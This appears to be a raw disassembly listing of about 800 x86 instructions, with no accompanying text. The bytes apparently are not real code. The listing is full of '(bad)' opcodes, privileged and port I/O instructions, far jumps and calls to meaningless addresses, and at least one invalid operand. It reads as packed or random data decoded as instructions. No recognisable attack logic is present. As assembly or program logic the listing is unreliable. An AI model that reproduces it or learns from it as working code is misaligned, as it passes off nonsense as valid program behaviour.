  41457f:	imul   ebx,esi,0x4d
  414582:	or     BYTE PTR [ebx],bl
  414584:	jg     0x41457a
  414586:	(bad)  
  414587:	mov    DWORD PTR [edi],ebx
  414589:	mov    eax,ds:0xbcc90981
  41458e:	mov    cl,0x54
  414590:	cmp    ebx,DWORD PTR [edi-0x53]
  414593:	arpl   WORD PTR [edi-0x13],cx
  414596:	fdivr  DWORD PTR [ebp+0x2f]
  414599:	rcl    DWORD PTR [ecx+0x52edb1c2],1
  41459f:	shl    DWORD PTR [ebx-0x54],cl
  4145a2:	jg     0x41452d
  4145a4:	adc    DWORD PTR [eax+0x446f1278],edi
  4145aa:	mov    ebp,0x815e733e
  4145af:	jge    0x414574
  4145b1:	sahf   
  4145b2:	in     al,0x65
  4145b4:	cld    
  4145b5:	or     ecx,DWORD PTR [edx]
  4145b7:	mov    dl,0xd7
  4145b9:	shl    BYTE PTR [edx-0x32ae8da8],1
  4145bf:	aas    
  4145c0:	inc    edx
  4145c1:	call   0x707342ba
  4145c6:	cmp    DWORD PTR [ebp+0x5f],edi
  4145c9:	mov    ?,esi
  4145cb:	retf   0x9a77
  4145ce:	aam    0xbc
  4145d0:	mov    esp,0xdf2174f7
  4145d5:	leave  
  4145d6:	lods   al,BYTE PTR ds:[esi]
  4145d7:	cli    
  4145d8:	mov    eax,0xda5ff439
  4145dd:	(bad)  
  4145de:	je     0x41460f
  4145e0:	aas    
  4145e1:	jmp    0xed74be82
  4145e6:	jp     0x414647
  4145e8:	or     eax,0x386c5473
  4145ed:	jp     0x41465a
  4145ef:	mov    eax,0xc08a5c03
  4145f4:	arpl   WORD PTR [edx],cx
  4145f6:	rep outs dx,BYTE PTR fs:[esi]
  4145f9:	loopne 0x4145ee
  4145fb:	(bad)  
  4145fc:	jmp    0x1c0e:0x41941912
  414603:	pop    edx
  414604:	sbb    ecx,DWORD PTR [esi-0x6]
  414607:	cmp    al,0xf0
  414609:	xor    eax,edx
  41460b:	adc    al,0x73
  41460d:	mov    ah,0x35
  41460f:	adc    ah,BYTE PTR [esi+0x673eae91]
  414615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414616:	mov    ds:0xd0734f96,eax
  41461b:	sbb    DWORD PTR [edi+0xb757c35],ebx
  414621:	jae    0x41460c
  414623:	push   0xfb71dd90
  414628:	rcr    BYTE PTR [eax+0x30f69cc7],0xf1
  41462f:	test   DWORD PTR [esi],esp
  414631:	fadd   QWORD PTR [eax+0x17]
  414634:	push   0x2cf27559
  414639:	mov    al,ds:0xc88d1194
  41463e:	mov    ebp,0x1146ee5e
  414643:	xor    al,0x6c
  414645:	dec    eax
  414646:	test   eax,0x1773333a
  41464b:	mov    eax,0xb6290f33
  414650:	mov    WORD PTR [ebp-0x3e0e4b1],cs
  414656:	sbb    esi,eax
  414658:	popa   
  414659:	sbb    al,0xfb
  41465b:	in     al,dx
  41465c:	or     eax,0x2187ff7d
  414661:	cld    
  414662:	aad    0x8d
  414664:	sahf   
  414665:	loop   0x41462a
  414667:	fsubr  QWORD PTR [ecx+0x2d]
  41466a:	sbb    ax,0x65d8
  41466e:	inc    ebp
  41466f:	sti    
  414670:	fcmovu st,st(2)
  414672:	stos   BYTE PTR es:[edi],al
  414673:	push   cs
  414674:	stc    
  414675:	inc    eax
  414676:	jo     0x414660
  414678:	aad    0x51
  41467a:	mov    al,0x2f
  41467c:	jecxz  0x414669
  41467e:	(bad)  
  41467f:	mov    ebx,0x3745ee37
  414684:	sbb    al,0xb5
  414686:	pop    DWORD PTR ds:0x35205b10
  41468c:	adc    al,0xb2
  41468e:	dec    eax
  41468f:	cmp    BYTE PTR [eax],dl
  414691:	push   es
  414692:	pop    ebp
  414693:	ret    0x9d2d
  414696:	mov    bh,0x8c
  414698:	adc    eax,0x2032ad12
  41469d:	clc    
  41469e:	or     eax,0x9c0c3634
  4146a3:	lahf   
  4146a4:	xor    DWORD PTR [eax+0x44],edx
  4146a7:	push   es
  4146a8:	sub    BYTE PTR [ebx-0xa986750],ah
  4146ae:	(bad)  
  4146af:	outs   dx,BYTE PTR ds:[esi]
  4146b0:	div    eax
  4146b2:	dec    esi
  4146b3:	into   
  4146b4:	mov    ebx,0x60a26bbf
  4146b9:	and    al,0x20
  4146bb:	mov    dh,0x76
  4146bd:	lock bound eax,QWORD PTR [ebp+0x44]
  4146c1:	(bad)  
  4146c2:	out    dx,eax
  4146c3:	lods   al,BYTE PTR ds:[esi]
  4146c4:	fimul  WORD PTR [edi]
  4146c6:	ss cmc 
  4146c8:	push   esi
  4146c9:	aam    0x8
  4146cb:	bound  ebp,QWORD PTR [ebx]
  4146cd:	dec    edx
  4146ce:	cmp    DWORD PTR [ebx-0x7f4e67db],0x711f8fef
  4146d8:	mov    eax,ds:0x7a670d0a
  4146dd:	inc    ebx
  4146de:	aaa    
  4146df:	sbb    eax,0xf7456dad
  4146e4:	scas   eax,DWORD PTR es:[edi]
  4146e5:	stc    
  4146e6:	aas    
  4146e7:	pop    eax
  4146e8:	jne    0x414716
  4146ea:	retf   0x5e46
  4146ed:	stos   DWORD PTR es:[edi],eax
  4146ee:	jge    0x41475c
  4146f0:	ror    BYTE PTR [edx],0xd2
  4146f3:	dec    ecx
  4146f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f5:	mov    ds:0x9003cdd9,al
  4146fa:	xor    ebp,DWORD PTR [esp+ebx*2-0x50]
  4146fe:	xor    cl,0xf6
  414701:	fistp  WORD PTR [esi]
  414703:	pusha  
  414704:	stos   DWORD PTR es:[edi],eax
  414705:	aam    0x79
  414707:	(bad)  
  414708:	or     eax,0x983e5b43
  41470d:	lahf   
  41470e:	lods   eax,DWORD PTR ds:[esi]
  41470f:	enter  0x3121,0xac
  414713:	sub    ebp,DWORD PTR [edx+ecx*1]
  414716:	and    DWORD PTR [eax+0x5a827030],0xffffffe6
  41471d:	cmp    ch,BYTE PTR [edx]
  41471f:	loop   0x414705
  414721:	lock retf 0x34e6
  414725:	daa    
  414726:	push   0xffffffbf
  414728:	sbb    dh,dl
  41472a:	sub    DWORD PTR [edi-0x2ec2c52f],0x15
  414731:	mov    dh,BYTE PTR [esi+ebp*2-0x6dd6795a]
  414738:	xchg   DWORD PTR [eax+0x6e34151d],esp
  41473e:	add    eax,0xb6513388
  414743:	pusha  
  414744:	pop    es
  414745:	mov    ds:0x19a53437,eax
  41474a:	and    al,0xe3
  41474c:	mov    eax,0x9ac759e2
  414751:	cld    
  414752:	mov    ebp,0x7d1a3fd0
  414757:	lahf   
  414758:	add    al,0x4c
  41475a:	jp     0x41474d
  41475c:	xlat   BYTE PTR ds:[ebx]
  41475d:	popf   
  41475e:	in     al,dx
  41475f:	add    DWORD PTR [ebx-0x5a],ebp
  414762:	repnz adc DWORD PTR [ebx-0x7e],edx
  414766:	xchg   ebx,eax
  414767:	lods   eax,DWORD PTR ds:[esi]
  414768:	add    BYTE PTR [ebx],bh
  41476a:	cmp    ebp,edx
  41476c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41476e:	hlt    
  41476f:	push   0x2f
  414771:	test   eax,0x5e4b8050
  414776:	data16 stos BYTE PTR es:[edi],al
  414778:	scas   eax,DWORD PTR es:[edi]
  414779:	pop    esp
  41477a:	xor    esi,DWORD PTR [edx]
  41477c:	adc    BYTE PTR [esi-0x4bb295c1],dl
  414782:	xchg   DWORD PTR [edi],esi
  414784:	cmp    ah,ch
  414786:	std    
  414787:	cmp    ebx,edx
  414789:	repnz and esp,DWORD PTR gs:[ebp-0x115a441c]
  414791:	or     esp,ebx
  414793:	aaa    
  414794:	jmp    0xf5410eb6
  414799:	shl    DWORD PTR [edx+0x52],1
  41479c:	ss pushf 
  41479e:	mov    cl,0x58
  4147a0:	loope  0x414722
  4147a2:	mov    ch,0x14
  4147a4:	add    DWORD PTR [esi-0x66],0x248153cb
  4147ab:	mov    esi,0xc5262b64
  4147b0:	mov    ebp,0x969592b
  4147b5:	retf   
  4147b6:	popf   
  4147b7:	push   edi
  4147b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b9:	sub    ecx,ecx
  4147bb:	xchg   ecx,eax
  4147bc:	sub    ebp,esp
  4147be:	push   0xffffffad
  4147c0:	scas   al,BYTE PTR es:[edi]
  4147c1:	mov    dh,0xc4
  4147c3:	cmp    al,0xc7
  4147c5:	lock and cl,BYTE PTR es:[esi]
  4147c9:	rcr    BYTE PTR [ebx-0x5b],0x6b
  4147cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ce:	cmp    eax,0x50cf2764
  4147d3:	dec    edx
  4147d4:	mov    dh,0x48
  4147d6:	push   ebp
  4147d7:	sbb    al,0x95
  4147d9:	in     eax,dx
  4147da:	or     eax,0x9a099a72
  4147df:	test   al,0x34
  4147e1:	jmp    0x9cc5:0xe6fb64dd
  4147e8:	in     al,dx
  4147e9:	bound  esi,QWORD PTR [ecx+eax*2-0x89d1ac]
  4147f0:	xor    eax,DWORD PTR [edx+0x23]
  4147f3:	push   ds
  4147f4:	pop    edi
  4147f5:	ins    BYTE PTR es:[edi],dx
  4147f6:	dec    ebp
  4147f7:	into   
  4147f8:	add    edi,DWORD PTR [esi+0x1e5041cb]
  4147fe:	in     al,dx
  4147ff:	mov    eax,ds:0xb172110f
  414804:	sbb    al,0x6
  414806:	adc    bh,ah
  414808:	jno    0x414858
  41480a:	sub    DWORD PTR [ebx],eax
  41480c:	mov    dl,ah
  41480e:	inc    esi
  41480f:	add    ebp,DWORD PTR [esi+0x61b2d517]
  414815:	or     bl,BYTE PTR [edx-0x80]
  414818:	adc    edi,DWORD PTR [ebx+0x56]
  41481b:	scas   al,BYTE PTR es:[edi]
  41481c:	and    BYTE PTR [ecx],bl
  41481e:	mov    ebx,edi
  414820:	in     eax,0x9b
  414822:	test   al,0xeb
  414824:	or     bh,BYTE PTR [edx]
  414826:	ret    0xccf6
  414829:	pop    ebx
  41482a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41482b:	cmp    esi,0x25ddec19
  414831:	aaa    
  414832:	sub    dh,BYTE PTR [esi+0x736ffc99]
  414838:	xchg   esp,eax
  414839:	fcomip st,st(5)
  41483b:	sub    ecx,edi
  41483d:	les    esp,FWORD PTR [eax]
  41483f:	xchg   DWORD PTR [edi-0x26956cc9],ebp
  414845:	xchg   edx,eax
  414846:	loop   0x4148a4
  414848:	ds dec ecx
  41484a:	lahf   
  41484b:	rcr    bl,0xfd
  41484e:	lds    edi,FWORD PTR [ecx-0x33424c17]
  414854:	rcr    BYTE PTR [ecx],cl
  414856:	xchg   esi,eax
  414857:	push   edx
  414858:	scas   eax,DWORD PTR es:[edi]
  414859:	push   0x49bf5bef
  41485e:	jmp    0x4148c8
  414860:	fdiv   st(7),st
  414862:	jge    0x41482f
  414864:	cmp    BYTE PTR [ebp+0x67],dl
  414867:	bound  ecx,QWORD PTR [esi+0x65]
  41486a:	mov    ebx,0x5040cd56
  41486f:	push   esi
  414870:	cmc    
  414871:	popa   
  414872:	mov    esi,0xf6f3e18d
  414877:	jle    0x4148f4
  414879:	shl    DWORD PTR [ecx],0xf2
  41487c:	add    bl,dl
  41487e:	mov    ds:0x41102915,eax
  414883:	mov    bh,0x32
  414885:	cli    
  414886:	es push edi
  414888:	add    esp,DWORD PTR [esi]
  41488a:	shr    BYTE PTR [ebx-0x307b238a],0xf3
  414891:	cmp    DWORD PTR [edx+0x4c],ecx
  414894:	fldcw  WORD PTR [ecx]
  414896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414897:	xor    DWORD PTR [esi],ebx
  414899:	inc    esp
  41489a:	cmp    BYTE PTR [ebx],bl
  41489c:	xchg   edx,eax
  41489d:	popa   
  41489e:	frstor [eax]
  4148a0:	adc    eax,0xfcc3c555
  4148a5:	jnp    0x4148fc
  4148a7:	dec    eax
  4148a8:	add    al,0x2e
  4148aa:	popa   
  4148ab:	pop    eax
  4148ac:	push   0xffffffcf
  4148ae:	retf   
  4148af:	cmp    BYTE PTR [edx-0x40010302],al
  4148b5:	add    cl,BYTE PTR [esi]
  4148b7:	mov    ecx,0x3a2b4eb9
  4148bc:	or     ebx,ebx
  4148be:	int3   
  4148bf:	inc    eax
  4148c0:	ret    0x8b97
  4148c3:	or     DWORD PTR [edi],ebx
  4148c5:	ffree  st(1)
  4148c7:	pop    esp
  4148c8:	pushf  
  4148c9:	lods   eax,DWORD PTR ds:[esi]
  4148ca:	in     eax,0xe0
  4148cc:	xor    al,0x70
  4148ce:	add    ah,BYTE PTR [esi-0x74]
  4148d1:	ror    edi,1
  4148d3:	loop   0x41490b
  4148d5:	call   0xd677452c
  4148da:	lods   al,BYTE PTR ds:[esi]
  4148db:	std    
  4148dc:	sbb    ebp,DWORD PTR ds:0x1b32b76d
  4148e2:	daa    
  4148e3:	or     BYTE PTR [esi+0x36],ch
  4148e6:	fxam   
  4148e8:	retf   0x21ed
  4148eb:	loope  0x4148f3
  4148ed:	dec    esi
  4148ee:	lahf   
  4148ef:	push   cs
  4148f0:	(bad)  
  4148f2:	call   0xf08136a4
  4148f7:	push   ds
  4148f8:	fst    QWORD PTR [eax+0x549d3820]
  4148fe:	ins    DWORD PTR es:[edi],dx
  4148ff:	imul   ebx,esp,0x55
  414902:	mov    ds:0xf456cdaf,al
  414907:	scas   eax,DWORD PTR es:[edi]
  414908:	arpl   WORD PTR [edx+0x36],si
  41490b:	and    DWORD PTR [edi+0x22],esp
  41490e:	jns    0x41491f
  414910:	sub    esp,DWORD PTR [edx-0x67]
  414913:	inc    ebp
  414914:	rcr    DWORD PTR [ebp+0x74],1
  414917:	gs gs pop ecx
  41491a:	outs   dx,DWORD PTR ds:[esi]
  41491b:	pop    esi
  41491c:	pop    ecx
  41491d:	test   DWORD PTR [esp+ecx*2],0x53bd4cb5
  414924:	mov    dl,0x4d
  414926:	repz add DWORD PTR [eax+0x6c7bfaeb],eax
  41492d:	fsubr  DWORD PTR [edi-0x6b]
  414930:	daa    
  414931:	cmc    
  414932:	cdq    
  414933:	mov    al,BYTE PTR [esi+0x39]
  414936:	popf   
  414937:	arpl   sp,ax
  414939:	mov    ds:0x63671025,eax
  41493e:	lods   eax,DWORD PTR ds:[esi]
  41493f:	add    BYTE PTR [edx+0x5e],0xbf
  414943:	pop    esi
  414944:	sbb    cl,bh
  414946:	mov    edi,0xb2351e67
  41494b:	(bad)  
  41494c:	daa    
  41494d:	fcom   QWORD PTR [esi]
  41494f:	inc    edx
  414950:	mov    edx,0x7730177d
  414955:	fwait
  414956:	loop   0x4148ff
  414958:	mov    ds:0xf0f118,eax
  41495d:	sbb    esp,edx
  41495f:	cmp    DWORD PTR [edx-0x1a511666],0x3c
  414966:	enter  0x6ffd,0x8d
  41496a:	(bad)  
  41496b:	retf   0xc87f
  41496e:	mov    ah,0x6
  414970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414971:	push   0xca599b58
  414976:	icebp  
  414977:	add    al,0xea
  414979:	lahf   
  41497a:	call   0xafb789d1
  41497f:	popf   
  414980:	dec    edi
  414981:	xor    BYTE PTR [edi],ah
  414983:	dec    ecx
  414984:	icebp  
  414985:	adc    BYTE PTR [eax-0x37dbbe52],ch
  41498b:	push   ss
  41498c:	imul   edx,ebx,0x2c
  41498f:	pushf  
  414990:	popa   
  414991:	xchg   edx,eax
  414992:	inc    edi
  414993:	push   0x2e1683a4
  414998:	push   cs
  414999:	xor    BYTE PTR [ecx],dl
  41499b:	out    0xbd,al
  41499d:	xor    ebp,DWORD PTR [edi-0x63]
  4149a0:	iret   
  4149a1:	ja     0x4149a0
  4149a3:	xor    eax,ebp
  4149a5:	(bad)  
  4149a6:	cli    
  4149a7:	mov    al,ds:0x9f86a745
  4149ac:	or     BYTE PTR [ebx-0x3f],ah
  4149af:	lods   eax,DWORD PTR ds:[esi]
  4149b0:	dec    ebp
  4149b1:	mov    dl,0x11
  4149b3:	enter  0x5885,0x70
  4149b7:	test   eax,0xf0737bb2
  4149bc:	jle    0x414a0b
  4149be:	jns    0x414987
  4149c0:	hlt    
  4149c1:	adc    DWORD PTR [ebx-0x11],ebp
  4149c4:	(bad)  
  4149c5:	cwde   
  4149c6:	(bad)
  4149c9:	xchg   ebx,eax
  4149ca:	mov    esp,0xa33d22d4
  4149cf:	pop    ebx
  4149d0:	sahf   
  4149d1:	dec    edi
  4149d2:	sar    BYTE PTR [edx+ebp*4-0x75],0xe3
  4149d7:	dec    edi
  4149d8:	aas    
  4149d9:	dec    esi
  4149da:	xchg   edx,eax
  4149db:	push   0x62
  4149dd:	jmp    0x414a44
  4149df:	cmp    dl,dh
  4149e1:	jb     0x4149a8
  4149e3:	cs mov ch,0x7c
  4149e6:	and    eax,0xab5b9497
  4149eb:	xor    DWORD PTR [ecx+0x43],ecx
  4149ee:	ds inc edi
  4149f0:	sti    
  4149f1:	jae    0x414a35
  4149f3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4149f5:	jp     0x414984
  4149f7:	call   0xacc0:0x3edad4a3
  4149fe:	push   ds
  4149ff:	jecxz  0x4149c6
  414a01:	pop    es
  414a02:	ds inc edi
  414a04:	mov    esi,0xc647ffcd
  414a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0a:	xor    ebx,DWORD PTR [edx]
  414a0c:	cli    
  414a0d:	popf   
  414a0e:	fsub   QWORD PTR [edx-0x41ffd476]
  414a14:	jle    0x4149e7
  414a16:	adc    eax,0xe9b793ea
  414a1b:	imul   ebx,DWORD PTR [ebp-0x3b],0xee2acc27
  414a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a23:	pop    ebp
  414a24:	mov    ebp,0x1a17f3a1
  414a29:	dec    ebp
  414a2a:	inc    esp
  414a2b:	daa    
  414a2c:	scas   eax,DWORD PTR es:[edi]
  414a2d:	push   edx
  414a2f:	int    0xa
  414a31:	lds    ebp,FWORD PTR [ecx+0x4f5439c6]
  414a37:	mov    esp,DWORD PTR [ebx-0x1c]
  414a3a:	pop    esp
  414a3b:	pop    ss
  414a3c:	mov    ecx,0xa977932c
  414a41:	ret    
  414a42:	loopne 0x414a66
  414a44:	inc    ebp
  414a45:	xchg   edi,eax
  414a46:	xor    ch,ch
  414a48:	cmp    cl,al
  414a4a:	test   DWORD PTR [ecx],ebp
  414a4c:	dec    esp
  414a4d:	loopne 0x4149d8
  414a4f:	dec    ecx
  414a50:	jns    0x414a45
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	push   es
  414a54:	mov    eax,0x2d815e6f
  414a59:	mov    dh,0x72
  414a5b:	xchg   edi,eax
  414a5c:	inc    eax
  414a5d:	stos   DWORD PTR es:[edi],eax
  414a5e:	cmp    BYTE PTR [ecx-0x6ef44dbd],0x26
  414a65:	adc    BYTE PTR [edx],ch
  414a67:	mov    cl,al
  414a69:	test   BYTE PTR [eax+esi*8+0x71d536bc],cl
  414a70:	inc    edi
  414a71:	repz mov esp,0x86d36f39
  414a77:	push   edi
  414a78:	xlat   BYTE PTR ds:[ebx]
  414a79:	jl     0x414aef
  414a7b:	cli    
  414a7c:	xor    eax,0xfd25319b
  414a81:	push   0x6abb292
  414a86:	or     eax,0xc2bd3ae6
  414a8b:	test   al,0xb5
  414a8d:	retf   0xcb0e
  414a90:	adc    al,0xee
  414a92:	popf   
  414a93:	lea    edi,[esi-0xeb1bccf]
  414a99:	mov    cl,0x1
  414a9b:	push   0x1d2db8d
  414aa0:	mov    ah,bh
  414aa2:	adc    ebx,esp
  414aa4:	inc    edi
  414aa5:	pop    esp
  414aa6:	mov    cs,WORD PTR [edi-0x1ea3e01f]
  414aac:	xor    ah,dh
  414aae:	fild   WORD PTR [ecx+esi*2-0x52]
  414ab2:	ja     0x414a39
  414ab4:	and    BYTE PTR [eax-0x42],cl
  414ab7:	inc    esi
  414ab8:	(bad)  
  414ab9:	cld    
  414aba:	aad    0x38
  414abc:	adc    eax,0xf87375d0
  414ac1:	jge    0x414ac6
  414ac3:	call   0xb4c115d8
  414ac8:	cmp    eax,DWORD PTR [edi+0x4959bb90]
  414ace:	mov    eax,0x540ed8a4
  414ad3:	jmp    0x414a72
  414ad5:	sub    al,0x24
  414ad7:	mov    fs,WORD PTR [eax-0x5a]
  414ada:	xor    BYTE PTR [eax+0x19],ah
  414add:	jecxz  0x414b28
  414adf:	cmp    bh,BYTE PTR [ebx-0x7f]
  414ae2:	outs   dx,DWORD PTR gs:[esi]
  414ae4:	or     eax,0x4b91603
  414ae9:	mov    ds:0x48bdf3fb,eax
  414aee:	test   eax,0xae617043
  414af3:	mov    edx,0xaa58a83f
  414af8:	push   ebx
  414af9:	mov    eax,ds:0xb7f619b9
  414afe:	sub    eax,0xa3b0fc30
  414b03:	jp     0x414b55
  414b05:	mov    ds:0xe1157b1e,al
  414b0a:	aam    0xd3
  414b0c:	lahf   
  414b0d:	dec    eax
  414b0e:	inc    ebx
  414b0f:	not    bh
  414b11:	cwde   
  414b12:	out    dx,al
  414b13:	addr16 push ds
  414b15:	test   al,0xf4
  414b17:	adc    eax,0xab5cdf4e
  414b1c:	adc    al,0xb4
  414b1e:	enter  0x8382,0x33
  414b22:	je     0x414b55
  414b24:	retf   
  414b25:	test   eax,0xd7fbd1ae
  414b2a:	push   0x22
  414b2c:	inc    ebx
  414b2d:	sub    DWORD PTR [ecx],0xffffffd2
  414b30:	and    BYTE PTR [ecx+0x7b],0xfa
  414b34:	mov    esi,0x5e1fe522
  414b39:	cmp    esi,0x22
  414b3c:	adc    BYTE PTR [bp+di],cl
  414b3f:	rol    DWORD PTR [eax+0x2d],0x89
  414b43:	sbb    edi,edi
  414b45:	into   
  414b46:	xor    ch,al
  414b48:	scas   al,BYTE PTR es:[edi]
  414b49:	push   edi
  414b4a:	xor    cl,0x41
  414b4d:	push   ds
  414b4e:	sub    edi,esp
  414b50:	std    
  414b51:	pop    edx
  414b52:	out    dx,eax
  414b53:	add    BYTE PTR [edx+0x4e0547ef],dh
  414b59:	xor    BYTE PTR [edi+0x33],ah
  414b5c:	adc    al,0xa5
  414b5e:	inc    eax
  414b5f:	aas    
  414b60:	sub    BYTE PTR [ebx+eax*8+0x6a796584],dl
  414b67:	popf   
  414b68:	push   edx
  414b69:	jle    0x414bba
  414b6b:	fwait
  414b6c:	sbb    al,ch
  414b6e:	add    eax,0x3c35e9ee
  414b73:	cmp    eax,0x458aa597
  414b78:	pusha  
  414b79:	mov    edi,0x5fb5e3ae
  414b7e:	cmp    BYTE PTR [ebx-0x42],dl
  414b81:	xchg   esi,eax
  414b82:	pop    ebp
  414b83:	push   esi
  414b84:	mov    ch,0x11
  414b86:	hlt    
  414b87:	ins    BYTE PTR es:[edi],dx
  414b88:	and    dh,dh
  414b8a:	or     al,0x9f
  414b8c:	jp     0x414bde
  414b8e:	mov    al,0x9d
  414b90:	mov    al,0xf
  414b92:	stos   DWORD PTR es:[edi],eax
  414b93:	push   esi
  414b94:	jmp    0x414b42
  414b96:	adc    eax,0x915d9a2c
  414b9b:	loope  0x414b69
  414b9d:	gs daa 
  414b9f:	push   ss
  414ba0:	es std 
  414ba2:	push   ss
  414ba3:	sub    ch,BYTE PTR [edx-0xa]
  414ba6:	pop    edi
  414ba7:	out    0xe7,al
  414ba9:	adc    ah,BYTE PTR [ebx-0x51]
  414bac:	cmp    eax,DWORD PTR [edi+eax*4+0x2]
  414bb0:	lods   al,BYTE PTR ds:[esi]
  414bb1:	sub    edx,edi
  414bb3:	inc    ebp
  414bb4:	mov    esp,0x2666bc6d
  414bb9:	mov    BYTE PTR [ecx+0x3a],ch
  414bbc:	pop    esi
  414bbd:	adc    al,0xa9
  414bbf:	mov    ebx,0x957a200b
  414bc4:	loope  0x414c3e
  414bc6:	shr    DWORD PTR [eax],cl
  414bc8:	leave  
  414bc9:	jns    0x414b7c
  414bcb:	and    eax,0x5841ab1b
  414bd0:	aad    0x3
  414bd2:	test   DWORD PTR [edx-0x1bdb6fdf],ebx
  414bd8:	(bad)  
  414bda:	rcl    DWORD PTR [ebx-0x2d60c19d],0xdd
  414be1:	xchg   esi,eax
  414be2:	repnz inc eax
  414be4:	stos   DWORD PTR es:[edi],eax
  414be5:	call   0x5895:0xa6227c98
  414bec:	lods   eax,DWORD PTR ds:[esi]
  414bed:	retf   
  414bee:	loop   0x414c3c
  414bf0:	adc    DWORD PTR [edi-0xd],ebx
  414bf3:	and    eax,0x7e8df0df
  414bf8:	cld    
  414bf9:	xchg   edi,eax
  414bfa:	jle    0x414bd6
  414bfc:	je     0x414c39
  414bfe:	xchg   esp,eax
  414bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c00:	push   esi
  414c01:	call   0xe2b807fb
  414c06:	(bad)  
  414c07:	and    eax,0x59f77ff5
  414c0c:	out    0xb3,al
  414c0e:	push   esp
  414c0f:	(bad)  
  414c10:	sahf   
  414c11:	nop
  414c12:	xor    dh,dh
  414c14:	and    eax,0x59ab47c9
  414c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c1a:	aaa    
  414c1b:	inc    edi
  414c1c:	or     DWORD PTR [esi-0x65267be6],esp
  414c22:	neg    BYTE PTR [edi+0x72a6f90f]
  414c28:	loop   0x414bb1
  414c2a:	adc    cl,ah
  414c2c:	fwait
  414c2d:	sub    al,0x52
  414c2f:	mov    cl,BYTE PTR [ebx]
  414c31:	cdq    
  414c32:	jae    0x414ca5
  414c34:	fild   DWORD PTR [ebx+0x5e38b744]
  414c3a:	sbb    al,0xdd
  414c3c:	push   edx
  414c3d:	sti    
  414c3e:	sub    al,0xd7
  414c40:	leave  
  414c41:	rcl    bl,1
  414c43:	(bad)  
  414c44:	fisubr WORD PTR fs:[eax+0x714fce5a]
  414c4b:	and    DWORD PTR [ebp+0x49],ebp
  414c4e:	push   es
  414c4f:	(bad)  
  414c50:	xor    DWORD PTR [esi],ecx
  414c52:	daa    
  414c53:	xchg   edx,eax
  414c54:	sbb    ch,BYTE PTR [esi]
  414c56:	cmp    edi,edx
  414c58:	xlat   BYTE PTR ds:[ebx]
  414c59:	icebp  
  414c5a:	or     edi,DWORD PTR ds:0xf3751abd
  414c60:	pop    DWORD PTR [edi+0x16]
  414c63:	test   DWORD PTR [edi+0x1f0fe208],edx
  414c69:	lock idiv ebx
  414c6c:	mov    ebp,0x322d7f90
  414c71:	or     eax,DWORD PTR [esi-0x16a5a601]
  414c77:	jmp    0xeaa42fdb
  414c7c:	mov    dl,0xc
  414c7e:	push   cs
  414c7f:	add    eax,0xbb050134
  414c84:	rol    al,1
  414c86:	loopne 0x414c6a
  414c88:	push   ds
  414c89:	cmp    eax,0x5830ff9d
  414c8e:	pop    ebx
  414c8f:	es sbb bh,bh
  414c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c93:	xchg   ebx,eax
  414c94:	dec    edx
  414c95:	push   ebp
  414c96:	add    DWORD PTR es:[ebx],eax
  414c99:	dec    eax
  414c9a:	mov    al,0x78
  414c9c:	imul   ecx,DWORD PTR [ebp+0x42f706e6],0xf0fd1e7c
  414ca6:	cmp    al,cl
  414ca8:	sahf   
  414ca9:	push   esp
  414caa:	mov    cl,0x81
  414cac:	repz mov ah,0x57
  414caf:	cwde   
  414cb0:	ret    
  414cb1:	adc    ebx,ebx
  414cb3:	ins    BYTE PTR es:[edi],dx
  414cb4:	or     eax,0x8289ecf4
  414cb9:	sahf   
  414cba:	mov    DWORD PTR [edi],ebx
  414cbc:	and    al,0x8c
  414cbe:	fld    DWORD PTR [edx]
  414cc0:	add    BYTE PTR [eax+edi*2-0x3ebf424d],0x79
  414cc8:	xchg   ecx,eax
  414cc9:	mov    bh,0x6e
  414ccb:	fdiv   DWORD PTR ds:0x11c7ea93
  414cd1:	(bad)  
  414cd2:	repz in eax,0xd
  414cd5:	add    al,bl
  414cd7:	pop    es
  414cd8:	out    dx,eax
  414cd9:	inc    ecx
  414cda:	mov    ds:0x5c1d5894,al
  414cdf:	pop    ss
  414ce0:	cmp    DWORD PTR [edx],esi
  414ce2:	mov    edi,0xf4f9b6e4
  414ce7:	cmp    DWORD PTR [esi+0x12],ebx
  414cea:	push   0x965e38a0
  414cef:	pop    ds
  414cf0:	or     DWORD PTR ss:[eax],0x41
  414cf4:	sbb    ah,bh
  414cf6:	into   
  414cf7:	loop   0x414cc9
  414cf9:	pop    ebx
  414cfa:	push   cs
  414cfb:	mov    ebx,0xd23ca13b
  414d00:	adc    dh,BYTE PTR [ecx+0x4064524d]
  414d06:	sti    
  414d07:	mov    dl,0x24
  414d09:	or     ah,BYTE PTR [ebx+edi*4-0x59]
  414d0d:	push   0xa526924b
  414d12:	test   bh,dh
  414d14:	outs   dx,BYTE PTR ds:[esi]
  414d15:	add    ch,ch
  414d17:	les    edi,FWORD PTR [eax]
  414d19:	int3   
  414d1a:	dec    edx
  414d1b:	ror    DWORD PTR [ebx+0x57d33e4],cl
  414d21:	push   es
  414d22:	cmc    
  414d23:	aaa    
  414d24:	xchg   edi,eax
  414d25:	xlat   BYTE PTR ds:[ebx]
  414d26:	gs dec ebp
  414d28:	(bad)  
  414d29:	jb     0x414d53
  414d2b:	mov    ch,0x5c
  414d2d:	daa    
  414d2e:	add    DWORD PTR [ecx+0x16ca5870],edx
  414d34:	pop    esi
  414d35:	jno    0x414d87
  414d37:	jmp    0x414d17
  414d39:	pushf  
  414d3a:	cmp    al,bh
  414d3c:	cmp    DWORD PTR [ecx-0x2aabbcd5],edi
  414d42:	push   ds
  414d43:	(bad)  
  414d44:	lock push ss
  414d46:	mov    edx,0x84ff87aa
  414d4b:	pushf  
  414d4c:	(bad)  
  414d4d:	jg     0x414ce0
